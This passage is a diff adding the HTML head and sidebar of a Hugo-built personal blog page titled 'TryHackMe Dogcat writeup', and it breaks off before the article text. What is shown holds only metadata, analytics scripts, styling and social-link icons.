@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.91ae35f985ba4ae6473b8defee39551f3ce6ed2769fdfa9b3df93f2eac0da4bc.js"></script>
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPLCKE0Z4E"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SPLCKE0Z4E', { 'anonymize_ip': false });
+}
+</script>
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=favicon.ico>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">ramsy0dev - TryHackMe Dogcat writeup</title>
+<meta property="og:title" content=ramsy0dev&#32;-&#32;TryHackMe&#32;Dogcat&#32;writeup />
+<meta name="twitter:title" content=ramsy0dev&#32;-&#32;TryHackMe&#32;Dogcat&#32;writeup />
+<meta itemprop="name" content=ramsy0dev&#32;-&#32;TryHackMe&#32;Dogcat&#32;writeup />
+<meta name="application-name" content=ramsy0dev&#32;-&#32;TryHackMe&#32;Dogcat&#32;writeup />
+<meta property="og:site_name" content="ramsy0dev" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/" />
+<link rel="canonical" href="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/" itemprop="url" />
+<meta name="url" content="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/" />
+<meta name="twitter:url" content="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/" />
+<meta property="og:url" content="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/" />
+
+
+<meta property="og:updated_time" content=1012-01-08T1211:40:23&#43;0100 />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://ramsy0dev.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/ramsy0dev" />
+<meta name="twitter:creator" content="https://twitter.com/ramsy0dev" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="ramsy0dev" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article" />
+<meta property="article:publisher" content="" />
+<meta property="og:article:published_time" content=1012-01-08T1211:40:23&#43;0100 />
+<meta property="article:published_time" content=1012-01-08T1211:40:23&#43;0100 />
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.122.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.9253bc12513d029afeda19b8831df5c2e217d0092a9f142adac20b5376162a30.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPLCKE0Z4E"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SPLCKE0Z4E', { 'anonymize_ip': false });
+}
+</script>
+
+
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2968783374193615"
+     crossorigin="anonymous"></script>
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://ramsy0dev.github.io/">
+                <img src="/images/profile-picture/ramsy0dev-profile-picture.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="https://ramsy0dev.github.io/">
+                <h1>ramsy0dev</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Computer wizard
+    <br>
+    <br>
+    <span style="font-weight:bold; font-size:40px;"> <span style="color:white;">Free</span> <span style="color:black;">P</span><span style="color:white;">a</span><span style="color:green;">l</span><span style="color:red;">estine</span></span>
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/">TryHackMe Dogcat writeup</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://ramsy0dev.github.io/posts/hello-world/">Hello World!!!</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/ramsy0dev">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/ramsy0dev">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/p/ramsy0dev">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Discord" href="https://discord.gg/hjvK5cJC">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="YouTube" href="https://youtube.com/@ramsy0dev">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M12.006 19.012h-.02c-.062 0-6.265-.012-7.83-.437a2.5 2.5 0 0 1-1.764-1.765A26.494 26.494 0 0 1 1.986 12a26.646 26.646 0 0 1 .417-4.817A2.564 2.564 0 0 1 4.169 5.4c1.522-.4 7.554-.4 7.81-.4H12c.063 0 6.282.012 7.831.437c.859.233 1.53.904 1.762 1.763c.29 1.594.427 3.211.407 4.831a26.568 26.568 0 0 1-.418 4.811a2.51 2.51 0 0 1-1.767 1.763c-1.52.403-7.553.407-7.809.407Zm-2-10.007l-.005 6l5.212-3l-5.207-3Z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Instagram" href="https://instagram.com/ramsy0dev">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9S287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7s74.7 33.5 74.7 74.7s-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8c-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8s26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9c-26.2-26.2-58-34.4-93.9-36.2c-37-2.1-147.9-2.1-184.9 0c-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9c1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0c35.9-1.7 67.7-9.9 93.9-36.2c26.2-26.2 34.4-58 36.2-93.9c2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6c-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6c-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6c29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6c11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="https://ramsy0dev.github.io//posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://ramsy0dev@gmail.com">
